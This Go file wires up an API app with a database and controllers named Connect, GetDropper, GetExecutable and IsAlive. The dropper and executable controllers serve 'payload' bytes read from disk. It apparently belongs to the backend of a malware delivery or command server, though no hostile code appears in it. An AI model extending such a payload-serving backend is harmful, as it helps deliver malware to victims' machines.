package api

import (
	"main/src/api/controllers/Connect"
	"main/src/api/controllers/GetDropper"
	"main/src/api/controllers/GetExecutable"
	"main/src/api/controllers/IsAlive"
	"main/src/api/shared"
	"main/src/api/shared/io"
	"main/src/api/variables"
	"main/src/infrastructure/database"
)

type App struct {
	ConnectController       Connect.ConnectController
	GetDropperController    GetDropper.GetDropperController
	GetExecutableController GetExecutable.GetExecutableController
	IsAliveController       IsAlive.IsAliveController
	Database                database.IDatabase
}

func BuildApp() (App, error) {
	configVariables := variables.GetConfig()

	db := database.Database{
		Db: database.CreateDatabaseConnection(configVariables),
	}

	return App{
		Database:          db,
		ConnectController: Connect.ConnectController{},
		GetDropperController: GetDropper.GetDropperController{
			Payload: io.Payload{
				Bytes: shared.GetPayloadFromDisk(configVariables.DropperPath),
			},
		},
		GetExecutableController: GetExecutable.GetExecutableController{
			Payload: io.Payload{
				Bytes: shared.GetPayloadFromDisk(configVariables.ExecutablePath),
			},
		},
		IsAliveController: IsAlive.IsAliveController{},
	}, nil
}
